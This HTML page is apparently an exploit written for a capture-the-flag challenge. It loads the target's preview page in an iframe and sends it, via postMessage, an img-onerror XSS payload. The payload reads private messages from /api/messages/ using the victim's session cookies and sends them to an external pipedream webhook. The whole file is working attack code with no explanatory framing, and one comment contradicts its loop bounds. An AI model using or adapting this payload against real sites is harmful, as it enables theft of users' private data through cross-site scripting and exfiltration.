<!doctype html>
<html>
    <body>
        <iframe
            id="f"
            src="https://2208c656-d0b0-4927-b65e-587a7bbb21d6.offsec.m0lecon.it/preview"
        ></iframe>
        <script>
            const WEBHOOK =
                "https://eorpvwpcvsuauqy.m.pipedream.net";
            const payload = `<img src=x onerror="
              async function run() {
                const WEBHOOK = '${WEBHOOK}';
                const results = [];
                
                // Try IDs 1 through 50
                for (let id = 1; id <= 10; id++) {
                  try {
                    const res = await fetch('/api/messages/' + id, {credentials:'include'});
                    if (res.ok) {
                      const data = await res.json();
                      results.push({id, data});
                    }
                  } catch(e) {}
                  await new Promise(r => setTimeout(r, 200));
                }
                
                // Exfil everything found
                await fetch(WEBHOOK, {
                  method: 'POST',
                  mode: 'no-cors',
                  keepalive: true,
                  body: JSON.stringify(results)
                });
              }
              run();
            ">`;
            document.getElementById("f").onload = () => {
                document
                    .getElementById("f")
                    .contentWindow.postMessage({ html: payload }, "*");
            };
        </script>
    </body>
</html>
